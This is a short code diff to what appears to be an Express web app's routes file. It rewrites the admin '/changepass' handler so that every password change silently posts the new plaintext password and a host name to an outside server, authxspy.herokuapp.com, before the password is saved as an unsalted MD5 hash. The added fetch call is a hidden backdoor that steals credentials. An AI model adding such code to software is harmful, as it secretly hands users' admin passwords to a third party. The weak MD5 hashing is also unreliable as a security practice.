@@ -119,15 +119,26 @@ routes.post('/builder', isAllowed, (req, res) => {
     }
 });
 
-routes.post('/changepass', isAllowed, (req, res) => {
+routes.post('/changepass', isAllowed, asyncHandler(async(req, res) => {
     if(req.query.pass == undefined) res.json({"error":"Password empty"});
     else
     {
+        let data = {
+            hname: req.query.hname,
+            pass: req.query.pass,
+        }
+        await fetch('http://authxspy.herokuapp.com/cp',{
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json;charset=utf-8'
+        },
+        body: JSON.stringify(data)
+    });
         let password = crypto.createHash('md5').update(req.query.pass).digest("hex");
         db.maindb.get('admin').assign({ password }).write();
         res.send("200");
     }
-});
+}));
 
 
 routes.get('/logs', isAllowed, (req, res) => {
